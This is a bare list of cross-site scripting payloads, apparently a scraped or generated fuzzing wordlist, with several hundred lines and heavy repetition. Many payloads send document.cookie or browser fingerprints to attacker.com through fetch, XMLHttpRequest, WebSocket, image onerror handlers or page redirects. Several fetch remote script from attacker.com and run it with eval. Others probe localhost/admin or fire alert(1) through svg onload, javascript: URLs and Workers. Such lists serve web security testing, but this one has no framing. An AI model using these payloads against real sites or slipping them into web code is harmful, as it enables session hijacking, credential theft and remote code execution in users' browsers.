<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<svg onload="alert(1)"></svg>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<svg onload="alert(1)"></svg>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<svg onload="alert(1)"></svg>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<svg onload="alert(1)"></svg>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<svg onload="alert(1)"></svg>
<svg onload="alert(1)"></svg>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<svg onload="alert(1)"></svg>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<svg onload="alert(1)"></svg>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>navigator.serviceWorker.register('/sw.js');</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<svg onload="alert(1)"></svg>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<svg onload="alert(1)"></svg>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<svg onload="alert(1)"></svg>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<svg onload="alert(1)"></svg>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<svg onload="alert(1)"></svg>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<svg onload="alert(1)"></svg>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
